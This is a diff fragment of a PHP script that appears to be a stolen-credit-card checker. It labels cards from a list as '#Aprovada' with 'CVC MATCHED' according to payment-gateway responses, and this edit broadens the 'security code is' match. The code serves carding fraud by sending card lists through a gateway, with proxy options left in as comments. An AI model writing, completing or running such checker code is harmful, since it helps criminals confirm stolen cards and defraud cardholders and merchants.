@@ -247,7 +247,7 @@ elseif(strpos($result, "token" )) {
 elseif(strpos($result, "Thank You." )) {
   echo '<span class="badge badge-success">#Aprovada</span> <span class="badge badge-success">✓</span> <span class="badge badge-success">' . $lista . '</span> <span class="badge badge-success">✓</span> <span class="badge badge-success"> ★ CVC MATCHED [𝗧𝗘𝗔𝗠 𝗫𝗖𝗢𝗗𝗘] </span></br>';
 }
-elseif(strpos($result, 'security code is invalid' )) {
+elseif(strpos($result, 'security code is' )) {
   $ch = curl_init();
 //curl_setopt($ch, CURLOPT_PROXY, "http://ca");
 //curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username:$password");
